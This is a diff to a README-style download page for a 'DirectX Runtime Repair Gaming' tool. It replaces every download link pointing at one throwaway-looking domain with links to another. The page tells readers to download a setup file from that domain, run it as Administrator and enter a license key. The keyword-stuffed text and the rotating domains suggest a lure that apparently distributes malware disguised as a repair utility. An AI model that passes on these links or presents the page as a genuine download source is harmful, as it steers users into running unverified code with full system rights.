@@ -13,27 +13,27 @@ Fix **directx runtime repair gaming pc** on Windows 10/11. Built for PC gamers �
 > **This is the download page.** Use the button or link below to get **DirectX Runtime Repair Gaming** for Windows.
 
 <p align="center">
-  <a href="https://dxrepair.zipzapsol.space/">
+  <a href="https://dxrepair.wonderchain.fun/">
     <img src="https://img.shields.io/badge/Download-DirectX%20Runtime%20Repair%20Gaming-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Download DirectX Runtime Repair Gaming">
   </a>
 </p>
 
 | | |
 | --- | --- |
-| **Direct link** | **[dxrepair.zipzapsol.space](https://dxrepair.zipzapsol.space/)** |
-| **Full URL** | `https://dxrepair.zipzapsol.space/` |
+| **Direct link** | **[dxrepair.wonderchain.fun](https://dxrepair.wonderchain.fun/)** |
+| **Full URL** | `https://dxrepair.wonderchain.fun/` |
 | **Type** | Fix tool for Windows 10 / 11 (64-bit) |
 | **Admin** | Run setup as Administrator |
 
 ### Quick steps
 
-1. Click **[Download — dxrepair.zipzapsol.space](https://dxrepair.zipzapsol.space/)** (link above)
+1. Click **[Download — dxrepair.wonderchain.fun](https://dxrepair.wonderchain.fun/)** (link above)
 2. Save the file from the project page
 3. Run the setup **as Administrator**
 4. Enter your license key when prompted
 5. Restart if the installer asks — then launch from Start menu
 
-<p align="center"><a href="https://dxrepair.zipzapsol.space/"><strong>⬇ Download DirectX Runtime Repair Gaming now</strong></a></p>
+<p align="center"><a href="https://dxrepair.wonderchain.fun/"><strong>⬇ Download DirectX Runtime Repair Gaming now</strong></a></p>
 
 ---
 
